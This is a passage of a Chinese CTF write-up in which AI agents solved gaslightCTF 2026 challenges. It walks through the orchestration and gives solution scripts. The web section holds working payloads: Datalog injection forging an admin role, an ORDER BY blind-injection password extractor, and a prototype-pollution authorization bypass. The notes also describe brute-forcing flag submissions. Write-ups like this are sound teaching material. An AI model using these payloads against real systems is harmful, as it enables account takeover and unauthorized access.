---
title: "gaslightCTF 2026 writeup"
date: 2026-08-15
updated: 2026-08-17
tags:
  - CTF
description: "gaslightCTF 2026 全记录：两轮 35 题解出 29（首轮 16/16、次轮 13/19），三个模型接力 + 主子 agent 编排解题实录、六道多模态题挂起复盘与全部题解（含最小 POC）"
draft: false
---

# gaslightCTF 2026 writeup

gaslightCTF 2026（Berg CTF 平台，动态计分，账号级实例互斥）一共放出 35 题，分两轮打完，
解出 **29**：

| 分类 | 战绩 | 备注 |
|---|---|---|
| Web | **5/5** | 全清 |
| Crypto | **9/9** | 全清 |
| Pwn | **5/5** | 全清 |
| Rev | **2/2** | 全清 |
| Forensics | 4/6 | 未解：4-piece-puzzle（拼图重建） |
| Misc | 4/10 | 未解：speedy / quack / meow（照片地理定位）、Tuning Keyboard v6.7（听歌）、mineguessor（Minecraft 种子） |

两轮的打法完全不同。**第一轮**（08-15，16 题全部解出）是传统的单会话硬打：
GLM-5.3 打前半场，DeepSeek v4-pro/flash 收后半场，两道要"看图"的题（good-luck!、odyssey）
由外部多模态模型 GPT-5.6-sol 补位——三个模型接力。**第二轮**（08-16 19:40 平台放出
19 道新题，08-17 收官，13/19）换成了编排式：主 agent 只做侦察、附件预下载、排序派单、
验收与总表，每题派一个 general-purpose 子 agent，≤3 并发滑窗 + 断点落盘续派。

未解的 6 题全部卡在视觉/听觉上：照片地理定位 ×3、拼图重建、旋律识别、Minecraft 种子
定位。但每题都推进到了"只差最后一眼/一耳"的位置——其中 layered-pages 证明了连通域
结构分析甚至能完全替代视觉（已解出）。怎么分工、踩了哪些坑、六道没解出来的题卡在哪，
都写在前面，题解放后面，每题附一段能直接跑的最小 POC。比赛已结束，flag 全部公开。

---

## 一、模型怎么分的工

### 第一轮（08-15）：三个模型接力，单会话 sess_f49b00b0

同一个 ZCode 会话（`sess_f49b00b0`）里，模型中途换过一次。归属是我事后从
本地 db 的 `model_usage` 表（342 次 GLM 请求 + 77 次 pro + 342 次 flash）
和各题文件时间戳交叉核对出来的，不是猜的。

| 模型 | 时段 | 完成的题目 |
|---|---|---|
| **GLM-5.3** | 09:23–10:53 | Web 3/3（biscuit、messageboard、json-warehouse）；Crypto 5/5（affine-hill、dream-starts 1/2、NEWJEANS IS FIVE、CompleteHTTP）；Misc 的 sanity-check、jsbox、useless-rce（利用链写到了 final.hs）；odyssey 前期 OSINT（10:28–10:36，被暂停） |
| **DeepSeek v4-pro / v4-flash** | 10:53–14:15 | useless-rce 收尾；ram-conservation；badcat（fd 复用）；compiled-source-sheets；good-luck! 分析（没解出来）；odyssey（图搜 + 网格盲试，`37.974,23.724` 被平台接受）；全部文档整理 |
| **GPT-5.6-sol（外部）** | 12:07 / 14:01 | good-luck!（右声道 0–4 kHz 频谱图）；odyssey（官方答案：Canellopoulos Museum 37.9729473,23.7260968 → `37.973,23.726`）。GLM 和 DeepSeek 都没多模态，看图题只能靠它 |

模型切换点：10:53 我发了句"继续"，GLM-5.3 最后一次请求 10:53:22，
DeepSeek 10:53:30 接管。12:24 会话触发过上下文压缩，之后又从 flash 切到 pro。

### 我给的 prompt（对照表，从会话记录提取）

| 时间 | 原始 prompt（摘录） | 响应的模型 |
|---|---|---|
| 09:23 | 完成 https://play.gaslightctf.cooking/challenges 中web漏洞的挑战，有什么需求轮子可以自己安装github（检索）/brew，并把你的解题思路记下来，全部解题与思路都放在 gaslightCTF2026/，每个题目一个文件夹。浏览器操作使用 agent-browser，凭据用chrome原有的："agent-browser", "--profile", "Default" | GLM-5.3 |
| 09:29 | 本地有python3 的 | GLM-5.3 |
| 09:54 | 现在解决下：crypto | GLM-5.3 |
| 10:12 | 现在有timeout了，也有gtimeout，可以用了，你那个进程run的有点久了，这是正常的吗？ | GLM-5.3 |
| 10:21 | 完成 misc、pwn、rev、forensics 按顺序。 | GLM-5.3 |
| 10:42 | 先跳过这个，社工的题目先不做（浪费时间），先做技术的题目 | GLM-5.3 |
| 10:53 | 继续 ← 模型切换点 | DeepSeek v4-pro → v4-flash |
| 11:20 | 继续 | DeepSeek v4-flash |
| 11:50 | 为什么要用docker？ | DeepSeek v4-flash |
| 12:07 | 这是题解，其他人做出来了：Forensics｜Good luck! Writeup …（外部题解全文，见下文 Forensics 节） | DeepSeek v4-flash（内容来源 GPT-5.6-sol） |
| 12:22 | 沉淀经验方法论。写到 `gaslightCTF2026/` 中。 | DeepSeek v4-flash |
| 12:24 | gaslightctf2026 … pwn 的badcat完成下 | DeepSeek v4-pro |
| 12:25 | 应该需要获取新的环境 or什么的？ | DeepSeek v4-pro |
| 12:38 | 完成这个题目：Categories misc … Do I colour grade better than Christopher Nolan? …（odyssey） | DeepSeek v4-pro |
| 12:51 | 在这个附近 gaslightCTF{37.974,23.726}。提交下flag，sleep提交，别并发，已经试过错误的：37.972/973/974,23.726 | DeepSeek v4-pro / v4-flash |
| 13:45 | 我让众多agent解题，几乎都是这个flag：37.973,23.726 … 你写一个脚本，把这附近的flag都交一下试试看？尝试100次最多。执行后返回结果。 | DeepSeek v4-flash |
| 14:01 | 这个是odyssey的题解，学习并更新下你的wp：…（官方题解全文，见上文 Misc 节） | DeepSeek v4-flash（内容来源 GPT-5.6-sol） |

> 会话 12:24 触发上下文压缩后，rollout 日志只剩压缩后的记录；GLM 时代的请求
> 完整存在本地 ZCode db（`model_usage` / `message` 表）。这也是本表归属的出处。

### 第二轮（08-16 ~ 08-17）：主 + 子 agent 编排，13/19

08-16 19:40 平台放出第二批 19 道新题（crypto 4、rev 1、pwn 3、web 2、forensics 4、
misc 5）。这次不打人海战，直接套用 THJCC 那套打磨过的编排模板（母版
`ctfhunter-prompt-template.md` 的 gaslightCTF 实例），主 agent 不进单题细节，
上下文全程干净：

| 执行者 | 完成的题目 |
|---|---|
| 子 agent 流水线（13 解） | down-the-stream-1/2、no-info、dream-starts-3、ohfrick、good-enough、ucas、thirds、crawl、corridors、blackout、icon-sketch、**layered-pages** |
| 主 agent（编排 + 验收 + 代提交） | 侦察题目列表、附件预下载、排序派单、验收、总表；speedy 后半程亲自攻坚（事件钉死、坐标候选排除、街景证据翻案） |
| 多模态挂起（6 题） | speedy / quack / meow / 4-piece-puzzle / tuning-keyboard-6 / mineguessor——视觉 API 限流 + 模型无视觉听力，按用户指示挂起，断点全量落盘各题 notes.md |

编排的骨架：

- **每题一个 general-purpose 子 agent，40 分钟时间盒**；断点落盘续派——子 agent
  中断/死亡后检查产物目录，把已完成分析注入新 prompt 重派，不重复劳动。
- **≤3 并发滑窗**：所有 agent 一律后台派发，任何一个结束（含失败）立即从队头
  补派，保持 3 个常满。THJCC 晚场实测 6 并发会连环触发模型层故障，这个教训直接沿用。
- **附件预下载**：主 agent 在派单前用 pantry 直链（`curl -A "<浏览器UA>"`）把全部
  附件下到对应题目目录，派单 prompt 只注入本地路径，子 agent 不做下载。
- **实例串行令牌**（gaslightCTF 平台特有）：账号级实例互斥，同账号同时只能一个实例
  ——实例题（web 黑盒、pwn 远程交互段）必须串行，主 agent 维护"实例归属"，用完
  立即 Kill 释放才派下一个；本地题（crypto/rev/纯文件取证）不受此限全程并行。
- **总表只由主 agent 写**（子 agent 并发改 README 有覆盖风险）；浏览器会话隔离，
  每个子 agent 用自己唯一的 `--session <名>`。

**解题优先级是用户定稿的**：pwn/rev/crypto（有源码可本地调试、AI 友好）→ 有源码
附件的 web/misc → 无源码黑盒 → 多模态最后。同优先级内解出数多者优先（越多越简单，
也是可解性实证）。19 题按这个排序打下来：Tier 1 的 8 道 pwn/rev/crypto 全清，
Tier 3 的 2 道黑盒 web 全清，Tier 4 文件取证 4 道里 blackout/icon-sketch/layered-pages
3 道本地化解，纯视觉/听觉的 6 道挂起。

**多模态挂起的决策**：视觉 API 撞上账户级 429 限流（8 次尝试跨 35 分钟全拒），
当前模型又没有原生视觉/听力——quack 的子 agent 在时间盒内把 EXIF、OCR、三轮 Yandex
图搜全做完后卡在"识别画面主体"，继续硬耗只会烧预算。按用户指示整体挂起，断点
全量落盘（每题 notes.md 按"已确凿的事实 / 当前假设与排除面 / 下一步（优先级）"
分节），赛后可续攻。

### 两轮打磨出来的纪律

- **Solves 计数 +1 不是判对信号**（corridors 的教训）：Berg CTF 的 Solves 是全局
  计数，**别人解出也会 +1**。corridors 的子 agent 报告"Solves 80→81 判对"，主 agent
  核对列表无 ✓ 标记后重新提交，才真正解出。唯一可靠信号 = 刷新后 Submit Flag
  表单消失 / "You have solved this challenge!" / 列表 ✓ 标记。
- **视觉 API 只用中性开放提问**（layered-pages 的教训）：带猜测提问（"是不是
  (z3r0)0ut？"）时视觉模型会"确认"不存在的内容——9 字符的字形行被读成只有 3 个
  主行字形。前任 agent 因此交了约 50 个错误 flag。规矩：只用"逐项描述所有可见
  内容，不确定的标注不确定"，读数必须本地手段交叉验证。
- **截图证据链要过文件大小审计**（speedy 的教训）：子 agent 的 7 张街景截图里
  4 张是 12KB 的占位图（页面加载失败的 UI 空壳，多张 md5 相同），当作证据会得出
  假结论。主 agent 用 RANSAC 单应内点数翻案：真同地点两张图 2055 个内点，
  假匹配只有 5 个——判别力极强，"看起来像"不算数。
- **模型层故障 ≠ 解题失败**：子 agent "Model returned no text" 中断后，它的分析
  产物（notes.md / 脚本 / 截图）仍在。speedy 的事件识别（IShowSpeed × HCMC 天桥）
  就是中断 agent 留下的完整成果，按断点续派或主 agent 接手即可，不要重做。
- **判定文案要先人工看一眼**（odyssey 的教训，第一轮）：提交脚本的正则 `*correct*`
  会误匹配 "incorrect" 里的子串；平台判对时显示的是 "You have solved this
  challenge!"，不是 "correct" 字样。写脚本前先把成功/失败/限流的文案各看一眼。
- **slug 与题名可能不一致**："Tuning Keyboard v6.7" 的 URL slug 是
  `tuning-keyboard-6`，从列表页链接（`get attr @ref href`）拿真实 slug。

---

## 二、题解（29 题，每题附真实可运行的最小 POC）

每题代码即对应本地题目目录 `<slug>/solve.py`（或 solve.sh）的真实内容（个别长的
截取核心段，行数已注明）；联网 POC 为赛时实例验证，赛后需自建环境或本地起题；
纯人眼/OSINT 类题（odyssey）注明豁免与可复现部分。29 题 = 28 个条目
（Where the dream starts 1/2 合并为一条）。**所有代码块默认折叠，按需点击展开。**

> **跨题套路**：凡是给了源码的题先在本地跑起来再打远程（省一大半试错）；先黑盒侦察
> 再翻白盒源码；盲注/爆破/位流提取这类重复劳动全部脚本化；静态结论必须动态验证。
> Web 的框架版本就是攻击面（json-warehouse）；Crypto 的魔改算法先找"缺了哪个部件"
> （NEWJEANS 没 S 盒、down-the-stream 的 LFSR 只有 8 bit）；Pwn 的 setuid 程序先画
> fd 流转图（badcat）；多模态降级路线 macOS Vision > tesseract > 连通域结构分析
> （layered-pages 就此破题）。

### Web（5/5）

**biscuit（120）— Biscuit 令牌 Datalog 注入**
**Flag**：`gaslightCTF{d3f1nit3ly_a_cak3_f0r_l3g4l_r34s0n5_9eb56136ee9c}`

登录态是 Biscuit 能力令牌（Datalog 写的），`/flag` 要求令牌带 `role("admin")`
事实。服务端把用户名直接拼进 Datalog 源码，没有任何转义。注册用户名
`x"); role("admin` 即可闭合字符串、追加事实、让语法保持合法，令牌还是服务器
自己签的——验证时用 protobuf 解码服务端令牌，确认 `role("admin")` 事实真的
进了授权层。

<details>
<summary>📜 biscuit 最小 POC（4 行）——点击展开</summary>

```python
import requests
s = requests.Session()
s.post(URL + "/register", json={"username": 'x"); role("admin'})
print(s.get(URL + "/flag").text)   # cookie 里的令牌已带 role("admin")
```

</details>

**messageboard（384）— ORDER BY 盲注，密码当探针**
**Flag**：`gaslightCTF{ar3_y0u_my_cl0s3_fr13nd_n0w?_3190aec242b4}`

输入全被过滤成字母数字，注入面看起来封死了。但 `ORDER BY ${column}` 能引用
任意列名，包括 `secret`（密码列）——标识符位置不吃字母数字过滤。于是把"注册
账号时的密码"当成探针：观察"按 secret 排序时 admin 排在探针前还是后"，构成
逐位比较的 oracle，二分恢复 admin 的 16 位 hex 密码，登录读 flag。整套
交互 ~200 次请求全部脚本化。

<details>
<summary>📜 messageboard 最小 POC（13 行）——点击展开</summary>

```python
def probe(prefix):   # 探针密码以 prefix 开头时，admin 是否排在探针后面
    register(prefix + "0" * (16 - len(prefix)))
    return order_of_admin_after_probe()

secret = ""
for pos in range(16):
    lo, hi = 0, 15
    while lo < hi:
        mid = (lo + hi) // 2
        if probe(secret + hex(mid)[2:]): hi = mid
        else: lo = mid + 1
    secret += hex(lo)[2:]
print(login(secret))   # 用 admin 密码登录读 flag
```

</details>

**json-warehouse（469）— 原型污染，免 cookie 越权**
**Flag**：`gaslightCTF{p0llut3d_w4r3h0us3s_ar3nt_v3ry_s4f3_c0nd1ti0ns_225a6ab744bb}`

`package.json` 里 Elysia 1.4.16 是第一步：查 advisory 锁定双 body schema 的
mergeDeep 原型污染，再拉 node_modules 源码本地确认漏洞点。`PUT /:key` 带双
schema 时 `__proto__` 键污染 `Object.prototype`；之后不带 cookie 请求时
`Cookie.value` 沿原型链取到 "1000"，服务端当成 admin——找的就是这种"读取时
回退到原型链"的取值点。

<details>
<summary>📜 json-warehouse 最小 POC（3 行）——点击展开</summary>

```bash
curl -sk -X PUT "$BASE/storage/x" -H 'Content-Type: application/json' \
  -d '{"value":"2","__proto__":{"value":"1000"}}'
curl -sk "$BASE/storage/flag"      # 无 cookie，直接读
```

</details>

**crawl（406）— robots.txt 是地图，不是门锁**
**Flag**：`gaslightCTF{LLM_1nduc3d_4r4chn0ph0b1a_de04d0ba1802}`

第二轮纯黑盒 web 题，题面只有一句 *"AI crawlers never respect the rules..."*。
侦察第一步永远是 robots.txt：里面除了 `Disallow: /super_secret/`，还有一条注释
要求 LLM agent 访问时带 `X-LLM-Agent` 头——题面的双关，真正"不守规矩"的是直接
无视 robots.txt 的访问者。直接 GET 被 Disallow 的目录：nginx autoindex 开着，
目录列表里躺着 `_flag.txt`。准备的 UA 矩阵（ua_list.txt）根本没用上，普通 UA
一路畅通。

<details>
<summary>📜 crawl solve.sh（30 行）——点击展开</summary>

```bash
#!/bin/bash
# crawl solve script — parameterized by HOST/PORT
# Usage: bash solve.sh <host> <port>
# The service is HTTPS-only (http 301 -> https); use -sk throughout.
set -u
HOST="${1:?usage: solve.sh <host> <port>}"
PORT="${2:?usage: solve.sh <host> <port>}"
BASE="https://${HOST}:${PORT}"
DIR="$(cd "$(dirname "$0")" && pwd)"
UA_NORMAL='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
OUT="${DIR}/recon_out"
mkdir -p "${OUT}"

echo "== Phase 1: robots.txt =="
curl -sk -m 8 -A "${UA_NORMAL}" "${BASE}/robots.txt" | tee "${OUT}/robots_body.txt"

# Extract first Disallow path (the flag directory)
DISP=$(grep -i '^[[:space:]]*Disallow' "${OUT}/robots_body.txt" | head -1 | sed 's/.*:[[:space:]]*//' | sed 's/[[:space:]]*$//')
[ -z "${DISP}" ] && { echo "no Disallow found in robots.txt"; exit 1; }
echo; echo "== Disallow path: ${DISP} =="

echo; echo "== Phase 2: list disallowed dir (autoindex) =="
curl -sk -m 8 -A "${UA_NORMAL}" "${BASE}${DISP}" | tee "${OUT}/dir_listing.txt"

# Find flag file in the listing
FLAGFILE=$(grep -oE 'href="[^"]+"' "${OUT}/dir_listing.txt" | sed 's/href="//;s/"//' | grep -viE '^(\.\./|/)$' | head -1)
[ -z "${FLAGFILE}" ] && { echo "no file found in dir listing"; exit 1; }
echo; echo "== Phase 3: fetch flag =="
curl -sk -m 8 -A "${UA_NORMAL}" -w '\n(HTTP %{http_code})\n' "${BASE}${DISP}${FLAGFILE}"
echo "done. artifacts in ${OUT}"
```

</details>

**corridors（447）— 迷宫路径就是 flag 的二进制**
**Flag**：`gaslightCTF{fr33d0m_4t_l4st_55b364531ed4}`

黑盒题，The Stanley Parable 风格：每个"走廊"节点只有 `l/` 和 `r/` 两个去向，
页面 `<title>` 是 oracle——`correct` 在正确链上，`wrong` 是死路。关键解码是
意识到**正确链的路径位串（l=0, r=1）按 8 位分组就是 flag 的 ASCII**：前几个
字节解出 `gaslightCTF{` 后就没有悬念了。脚本从根开始每层并行探测两个子节点、
跟随 correct 分支收集位串，229 步、328 bit、41 字符，走到标题为 `freedom`
的终点页，全程约 2 分钟。

这题还有个编排插曲：子 agent 报告"Solves 80→81 判对"，实际是别人解出造成的
全局计数 +1；主 agent 核对列表无 ✓ 后重新提交才真正解出——此后判对只认表单
消失 / "You have solved this challenge!" / ✓ 标记。

<details>
<summary>📜 corridors solve.py（72 行）——点击展开</summary>

```python
#!/usr/bin/env python3
"""gaslightCTF 2026 corridors — solve script.

迷宫每节点只有 l/ r/ 两个去向，<title>correct</title> 表示在正确链上，
wrong 是死路。正确链的路径 l=0, r=1 按 8 位分组就是 flag 的 ASCII 编码：
沿唯一正确分支走到终点页(freedom)，解码路径即得 flag。

用法: python3 solve.py <host:port>
"""
import sys, re, ssl, http.client, threading, time

hostport = sys.argv[1] if len(sys.argv) > 1 else sys.exit("usage: python3 solve.py <host:port>")
host = hostport.split('/')[-1]
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0'}

def make_conn():
    return http.client.HTTPSConnection(host, timeout=15, context=ctx)

def fetch(conn, path):
    try:
        conn.request('GET', path, headers=UA)
        r = conn.getresponse()
        return r.status, r.read(20000)
    except Exception:
        return None

def get(conn, path):
    res = fetch(conn, path)
    if res is None:
        return fetch(make_conn(), path) or (0, b'')
    return res

def title(body):
    m = re.search(rb'<title>(.*?)</title>', body, re.S)
    return m.group(1).decode('utf-8', 'replace').strip().lower() if m else ''

def probe(conn, path, out, key):
    out[key] = title(get(conn, path)[1])

path = '/'
bits = []
t0 = time.time()
conns = [make_conn(), make_conn()]
step = 0
while True:
    step += 1
    out = {}
    ths = [
        threading.Thread(target=probe, args=(conns[0], path + 'l/', out, 'l')),
        threading.Thread(target=probe, args=(conns[1], path + 'r/', out, 'r')),
    ]
    for t in ths: t.start()
    for t in ths: t.join()
    correct = next((k for k, v in out.items() if v == 'correct'), None)
    if correct is None:  # 终点：非 correct/wrong 页
        other = next((k for k, v in out.items() if v not in ('correct', 'wrong')), None)
        if other:
            path += other + '/'
            bits.append(1 if other == 'r' else 0)
        print(f'[maze end] title={out} steps={step} bits={len(bits)} t={time.time()-t0:.0f}s')
        break
    path += correct + '/'
    bits.append(1 if correct == 'r' else 0)
    if step % 50 == 0:
        print(f'[{step}] bits={len(bits)}', flush=True)

flag = ''.join(chr(int(''.join(map(str, bits[i:i+8])), 2)) for i in range(0, len(bits) - 7, 8))
print('FLAG:', flag)
assert flag.startswith('gaslightCTF{') and flag.endswith('}'), 'decode check failed'
```

</details>

### Crypto（9/9）

**affine-hill（100）— 差分消常数，矩阵求逆**
**Flag**：`gaslightCTF{kn0wn-pl41nt3xt-4tt4cks-4r3-sup3r-s1mpl3}`

4×4 Affine-Hill：`c = p·K + b (mod 37)`，字母表 37 字符。仿射密码的常数项 b
是最大的未知数，但同一明文的差分直接消掉它：`c_i - c_1 = (p_i - p_1)·K`，
4 组差分构造矩阵求逆解出 K，回代求 b。展平 20 字符就是 keyword。

<details>
<summary>📜 affine-hill 最小 POC（6 行）——点击展开</summary>

```python
import sympy
A = sympy.Matrix([[p_i - p_1 for p_i in blocks(PT)][:4]])  # 4 组明文差分
E = sympy.Matrix([[c_i - c_1 for c_i in blocks(CT)][:4]])  # 对应密文差分
K = A.inv_mod(37) * E
b = (blocks(CT)[0] - blocks(PT)[0] * K) % 37
print(K.tolist() + b.tolist())   # 展平 20 字符即 keyword
```

</details>

**Where the dream starts 1/2（100）— 凯撒、列移位**
**Flag**：`gaslightCTF{caesarreallylikedashiftofthree}` / `gaslightCTF{tr4nsp0s3-2-th3-k3y-0f-g-fl4t!}`

1 是凯撒移位 3，`bytes(c - 3 for c in ct)` 直接出明文。2 是 3 列列移位
（恒等置换），密文三段按行交错读回，丢尾部补位噪声。

<details>
<summary>📜 dream-starts-1/2 最小 POC（6 行）——点击展开</summary>

```python
# dream-starts-1
print(bytes((c - 3) % 128 for c in ct))          # 凯撒 -3

# dream-starts-2：把密文按 3 列均分，按列序读回
n = len(ct) // 3
print("".join(ct[i::n] for i in range(n))[:-2])  # 尾部补位 "eo" 丢弃
```

</details>

**NEWJEANS IS FIVE（257）— 没 S 盒的 AES 是线性的**
**Flag**：`gaslightCTF{newj34ns-nv-d!es}`

AES 里唯一非线性部件 SubBytes 被换成恒等映射，整个算法退化成 GF(2) 仿射变换
`E(x) = L(x) ⊕ c`。手写密码实现先找"缺了哪一步"：S 盒没了整体就线性化。
用任意密钥本地加密 128 个单位向量构造 L，一组已知明文对求 c，解线性方程组
出 flag。

<details>
<summary>📜 NEWJEANS IS FIVE 最小 POC（7 行）——点击展开</summary>

```python
L = np.zeros((128, 128), dtype=np.uint8)
for i in range(128):
    e = np.zeros(128, dtype=np.uint8); e[i] = 1
    L[:, i] = enc(e) ^ enc(np.zeros(128, dtype=np.uint8))
c = enc(pt) ^ (L @ pt) & 1                       # 常数项
flag = gf2_solve(L, enc_flag ^ c)                # 高斯消元
print(bytes(flag).decode())
```

</details>

**CompleteHTTP（390）— 弱素数逐 limb 分解，解 TLS**
**Flag**：`gaslightCTF{gu3s5_y0u_n33d_l0ng_sl33v35_ev3n_in_5umm3r?}`

服务端是自写 TLS（.NET），反编译 bundle 的 IL 发现证书 RSA 模数每 32 位 limb
只有 1 个非零字节——弱结构素数。从 LSB 开始逐 limb 解字节乘法方程
（`n_i = Σ p_j·q_{i-j}`），约束搜索 DFS 秒级分解 N，比通用 ECM 快得多；
RSA 解 premaster 后按 TLS 1.2 EMS 派生密钥，解开 pcap 里的应用数据。
（pcapng 不能过 tcpdump 转换，直接 Python 解块结构重组 TCP 流。）

<details>
<summary>📜 CompleteHTTP 最小 POC（5 行）——点击展开</summary>

```python
# 逐 limb：n_i = Σ p_j·q_{i-j}，p/q 每 limb 只有 1 个非零字节
# 非零字节位置 → 约束搜索（DFS），复杂度远低于 ECM
for i in range(limbs):
    for bp, bq in product(nonzero_positions, repeat=2):
        if check_limb(i, bp, bq): pin(p, bp); pin(q, bq); break
```

</details>

**down-the-stream-1（364）— 8-bit LFSR：256 个 IV 爆破**
**Flag**：`gaslightCTF{d0nt-r3veal-y0ur-co3ff-v3ct0r}`

第二轮开场 crypto。8-bit LFSR 同步流密码，反馈多项式公开。两个侦察结论钉死
攻击面：`next_register` 每轮移位后 `& 0xff` 截断，**状态空间只有 256**；且 IV
若 > 0xff 会在 `bytearray.append` 处抛 ValueError——脚本根本跑不了，所以 IV
必在 [0, 255]。于是别急着推抽头，直接枚举 256 个 IV 各自重新生成密钥流解密，
用 `gaslightCTF{` 前缀过滤，唯一命中 IV = 0x8e。小状态流密码先想穷举。

<details>
<summary>📜 down-the-stream-1 solve.py（49 行）——点击展开</summary>

```python
#!/usr/bin/env python3
"""solve.py — down-the-stream-1

8-bit LFSR 流密码：next_register 每轮把寄存器左移 8 次并 & 0xff 截断，
状态空间仅 256。IV 若 > 0xff 会在 bytearray.append 处抛 ValueError，
故 IV 必落在 [0, 255]，直接暴力枚举并用已知明文前缀验证。
"""

CT_HEX = open(
    "output.txt"
).read().strip()
CT = bytes.fromhex(CT_HEX)
PREFIX = b"gaslightCTF{"


def next_register(register: int) -> int:
    for _ in range(8):
        feedback = (
            ((register >> 7) & 1)
            ^ ((register >> 5) & 1)
            ^ ((register >> 4) & 1)
            ^ ((register >> 3) & 1)
        )
        register = ((register << 1) | feedback) & 0xFF
    return register


def decrypt(ct: bytes, iv: int) -> bytes:
    register = iv
    pt = bytearray()
    pt.append(ct[0] ^ register)
    for i in range(1, len(ct)):
        register = next_register(register)
        pt.append(ct[i] ^ register)
    return bytes(pt)


def main() -> None:
    for iv in range(256):
        pt = decrypt(CT, iv)
        if pt.startswith(PREFIX):
            print(f"IV = {iv:#04x}")
            print(f"FLAG = {pt.decode(errors='replace')}")
            return
    print("no candidate found")


if __name__ == "__main__":
    main()
```

</details>

**down-the-stream-2（388）— 16-bit LFSR：把抽头当未知数**
**Flag**：`gaslightCTF{st0p-rev3al1ng-4ll-the-pl4int3xts}`

续作把状态扩到 16 bit（2^16 爆破不动），并且抽掉了 `generate_feedback`——
反馈函数本身是未知的布尔函数。转折点是一个观察：16 步转移中，反馈位序列
f_0..f_15 恰好等于 r_{i+1} 的 16 个 bit（MSB 在前）。于是从 12 字节已知明文
"Hello, world" 还原出 6 个连续寄存器值后，不只是能差分出 96 个反馈位，还能
**重建每段转移的全部中间状态**——共 5×16 = 80 个 (16-bit 状态, 反馈位) 样本。
把"反馈是线性 tap-XOR"当假设、16 个抽头系数当未知数，80 个方程 GF(2) 高斯
消元，解出 taps = [6, 9, 11, 12, 13, 15] 且全部样本自洽——假设成立。flag
密文前 2 字节直接还原 IV = 0x8ee8，恰好是前作 8-bit IV 0x8e 的回文（系列
彩蛋），intercepted 密文回放双重验证。

<details>
<summary>📜 down-the-stream-2 solve.py（135 行）——点击展开</summary>

```python
#!/usr/bin/env python3
"""solve.py — down-the-stream-2 (gaslightCTF2026, crypto)

16-bit LFSR 流密码：next_register 每轮把寄存器左移 16 次，
feedback 位由未知的 generate_feedback(register) 生成（1 bit）。
对每 2 字节明文块，密文 = 明文 ^ 当前 16 位寄存器。

攻击链：
1. 已知明文 "Hello, world"（12 字节）与密文 XOR，还原出 6 个连续寄存器
   值 r0..r5（r_{i+1} = next_register(r_i)）。
2. 每段 16 步转移中，反馈位序列 f_0..f_15 恰好等于 r_{i+1} 的 16 个 bit
   （MSB 在前），据此重建出 80 个 (状态, 反馈位) 样本及全部中间状态。
3. 假设 generate_feedback 为线性（抽头 bit XOR）：对 80 个样本在 GF(2)
   上高斯消元解 16 个抽头系数。本题解出 taps = [6,9,11,12,13,15]，
   全部 80 个样本自洽，故反馈函数为 XOR(bit6,bit9,bit11,bit12,bit13,bit15)。
4. flag 明文以 "gaslightCTF{" 开头，前 2 字节即可还原 IV（恰与
   intercepted 相同，0x8ee8），随后用恢复的 LFSR 整体解密并校验前缀。

用法: python3 solve.py
"""

import os

HERE = os.path.dirname(os.path.abspath(__file__))

with open(os.path.join(HERE, "intercepted.txt")) as f:
    PT = f.readline().strip().encode()
    CT_HEX = f.readline().strip()
with open(os.path.join(HERE, "output.txt")) as f:
    FLAG_CT = bytes.fromhex(f.read().strip())

CT = bytes.fromhex(CT_HEX)


def recover_registers(pt: bytes, ct: bytes) -> list[int]:
    regs = []
    for i in range(0, len(pt), 2):
        regs.append((ct[i] ^ pt[i]) << 8 | (ct[i + 1] ^ pt[i + 1]))
    return regs


def build_samples(regs: list[int]) -> list[tuple[int, int]]:
    """从相邻寄存器对重建 16 步转移的 (状态, 反馈位) 样本。

    反馈位序列 f_0..f_15（f_0 最先进入）满足
    r_{i+1} = sum f_k * 2^(15-k)，即 r_{i+1} 的 bit15..bit0 依次等于 f_0..f_15。
    """
    samples = []
    for a, b in zip(regs, regs[1:]):
        fb_bits = [(b >> (15 - k)) & 1 for k in range(16)]
        s = a
        for k in range(16):
            samples.append((s, fb_bits[k]))
            s = ((s << 1) | fb_bits[k]) & 0xFFFF
    return samples


def gauss_elim(A: list[list[int]], b: list[int]) -> list[int] | None:
    """GF(2) 高斯消元解 A x = b；无解返回 None。"""
    n = len(A[0])
    aug = [row[:] + [bv] for row, bv in zip(A, b)]
    pivots = []
    r = 0
    for c in range(n):
        piv = next((i for i in range(r, len(aug)) if aug[i][c]), None)
        if piv is None:
            continue
        aug[r], aug[piv] = aug[piv], aug[r]
        for i in range(len(aug)):
            if i != r and aug[i][c]:
                aug[i] = [x ^ y for x, y in zip(aug[i], aug[r])]
        pivots.append(c)
        r += 1
    for row in aug[r:]:
        if all(v == 0 for v in row[:-1]) and row[-1]:
            return None
    x = [0] * n
    for i, c in enumerate(pivots):
        x[c] = aug[i][-1]
    return x


def generate_feedback(register: int, taps: list[int]) -> int:
    b = 0
    for j in taps:
        b ^= (register >> j) & 1
    return b


def next_register(register: int, taps: list[int]) -> int:
    for _ in range(16):
        register = ((register << 1) | generate_feedback(register, taps)) & 0xFFFF
    return register


def decrypt(ct: bytes, iv: int, taps: list[int]) -> bytes:
    out = bytearray()
    reg = iv
    out.append(ct[0] ^ (reg >> 8))
    out.append(ct[1] ^ (reg & 0xFF))
    for i in range(2, len(ct), 2):
        reg = next_register(reg, taps)
        out.append(ct[i] ^ (reg >> 8))
        out.append(ct[i + 1] ^ (reg & 0xFF))
    return bytes(out)


def main() -> None:
    regs = recover_registers(PT, CT)
    samples = build_samples(regs)
    A = [[(s >> j) & 1 for j in range(16)] for s, _ in samples]
    b = [f for _, f in samples]
    x = gauss_elim(A, b)
    if x is None:
        raise SystemExit("线性假设不成立：样本在 GF(2) 上无解")

    taps = [j for j in range(16) if x[j]]
    assert all(
        (sum(((s >> j) & 1) * x[j] for j in range(16)) & 1) == f for s, f in samples
    ), "抽头解未通过全部样本自洽校验"
    print(f"taps = {taps}")

    # 校验：用恢复的 LFSR 重放 intercepted 密文
    assert decrypt(CT, regs[0], taps) == PT, "intercepted 回放失败"

    # flag 前缀还原 IV
    iv = (FLAG_CT[0] ^ ord("g")) << 8 | (FLAG_CT[1] ^ ord("a"))
    pt = decrypt(FLAG_CT, iv, taps)
    print(f"IV = {iv:#06x}")
    print(f"FLAG = {pt.decode(errors='replace')}")
    assert pt.startswith(b"gaslightCTF{") and pt.endswith(b"}"), "flag 校验失败"


if __name__ == "__main__":
    main()
```

</details>

**no-info（392）— 纯密文：退火先破句子，QWERTY 才是答案**
**Flag**：`gaslightCTF{0b5cur1ty-41nt-n0t-s3curity}`

